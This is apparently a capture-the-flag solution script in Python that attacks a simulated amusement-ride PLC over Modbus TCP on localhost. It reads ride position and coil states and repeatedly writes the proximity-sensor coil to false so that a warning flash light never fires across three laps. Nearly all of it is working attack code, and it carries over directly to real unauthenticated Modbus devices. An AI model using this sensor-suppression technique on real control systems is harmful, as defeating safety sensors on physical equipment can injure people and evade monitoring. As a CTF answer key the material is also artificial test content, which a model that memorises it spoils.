#!/usr/bin/env python3
"""
CTF Challenge 8: Stealth Mode (Medium - 200 points)
Keep the ride running for at least 3 full laps without the light ever flashing

Method: Continuously suppress proximity_sensor signals for sustained period
"""

import socket
import struct
import time

PLC_HOST = 'localhost'
PLC_PORT = 502

def build_write_coil(transaction_id, address, value):
    """Build a Modbus Write Single Coil request"""
    protocol_id = 0
    data_length = 6
    unit_id = 1
    function_code = 5

    value_bytes = 0xFF00 if value else 0x0000

    return struct.pack('>HHHBBHH',
        transaction_id,
        protocol_id,
        data_length,
        unit_id,
        function_code,
        address,
        value_bytes
    )

def build_read_coils(transaction_id, address, quantity):
    """Build a Modbus Read Coils request"""
    protocol_id = 0
    data_length = 6
    unit_id = 1
    function_code = 1

    return struct.pack('>HHHBBHH',
        transaction_id,
        protocol_id,
        data_length,
        unit_id,
        function_code,
        address,
        quantity
    )

def build_read_register(transaction_id, address, quantity):
    """Build a Modbus Read Holding Registers request"""
    protocol_id = 0
    data_length = 6
    unit_id = 1
    function_code = 3

    return struct.pack('>HHHBBHH',
        transaction_id,
        protocol_id,
        data_length,
        unit_id,
        function_code,
        address,
        quantity
    )

def parse_read_coils_response(response):
    """Parse a Read Coils response"""
    if len(response) < 9:
        return None

    byte_count = response[8]
    coil_bytes = response[9:9+byte_count]

    coils = []
    for byte_val in coil_bytes:
        for bit in range(8):
            coils.append(bool(byte_val & (1 << bit)))

    return coils

def parse_read_registers_response(response):
    """Parse a Read Holding Registers response"""
    if len(response) < 9:
        return None

    byte_count = response[8]
    num_registers = byte_count // 2

    registers = []
    for i in range(num_registers):
        offset = 9 + (i * 2)
        reg_value = struct.unpack('>H', response[offset:offset+2])[0]
        registers.append(reg_value)

    return registers

def main():
    print("="*60)
    print("CTF Challenge 8: Stealth Mode")
    print("="*60)
    print()
    print("Objective: Complete 3 laps without flash light activation")
    print("Method: Sustained suppression of proximity_sensor signals")
    print()
    print("⚠️  This challenge requires the ride to be running")
    print("    Start the ride in the web interface before running")
    print()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect((PLC_HOST, PLC_PORT))
        print(f"✓ Connected to PLC at {PLC_HOST}:{PLC_PORT}")
    except Exception as e:
        print(f"❌ Failed to connect: {e}")
        return

    transaction_id = 1
    last_position = 0
    lap_count = 0
    suppression_count = 0
    flash_detected = False
    start_time = time.time()

    print("\n[Attack Phase] Monitoring and suppressing signals...")
    print("Target: 3 complete laps")
    print("Duration: ~27 seconds (9 positions × 1 sec × 3 laps)")
    print()
    print("Press Ctrl+C to stop\n")

    try:
        while lap_count < 3:
            # Read current position
            request = build_read_register(transaction_id, 1, 1)
            sock.send(request)
            response = sock.recv(1024)
            registers = parse_read_registers_response(response)

            current_position = 0
            if registers:
                current_position = registers[0]

            # Detect lap completion (position wrapped around)
            if current_position < last_position and last_position > 0:
                lap_count += 1
                elapsed = time.time() - start_time
                print(f"[LAP {lap_count}] Completed in {elapsed:.1f}s - Flash: {'YES ❌' if flash_detected else 'NO ✓'}")

                if flash_detected:
                    print("   ⚠️  Flash detected - challenge failed")
                    break

            last_position = current_position
            transaction_id += 1

            # Read proximity sensor and flash light
            request = build_read_coils(transaction_id, 0, 4)
            sock.send(request)
            response = sock.recv(1024)
            coils = parse_read_coils_response(response)

            if coils:
                proximity_sensor = coils[0]
                flash_light = coils[3]

                # Check if flash activated
                if flash_light:
                    flash_detected = True

                # Suppress proximity sensor if active
                if proximity_sensor:
                    transaction_id += 1
                    suppress_request = build_write_coil(transaction_id, 0, False)
                    sock.send(suppress_request)
                    sock.recv(1024)
                    suppression_count += 1
                    print(f"[SUPPRESS] Position {current_position} - Intercepted proximity signal #{suppression_count}")

            transaction_id += 1
            time.sleep(0.1)

        if lap_count >= 3 and not flash_detected:
            elapsed = time.time() - start_time
            print(f"\n{'='*60}")
            print("🎯 SUCCESS! Stealth Mode completed")
            print(f"   Completed 3 laps in {elapsed:.1f}s")
            print(f"   Proximity signals suppressed: {suppression_count}")
            print(f"   Flash light activations: 0")
            print("   Challenge completed!")
            print(f"{'='*60}")

    except KeyboardInterrupt:
        elapsed = time.time() - start_time
        print(f"\n\n[Attack Stopped]")
        print(f"  Laps completed: {lap_count}/3")
        print(f"  Duration: {elapsed:.1f}s")
        print(f"  Suppressions: {suppression_count}")
        print(f"  Flash detected: {'YES ❌' if flash_detected else 'NO ✓'}")

        if lap_count >= 3 and not flash_detected:
            print("\n🎯 Challenge may still be completed - check dashboard")
    finally:
        sock.close()

if __name__ == '__main__':
    main()
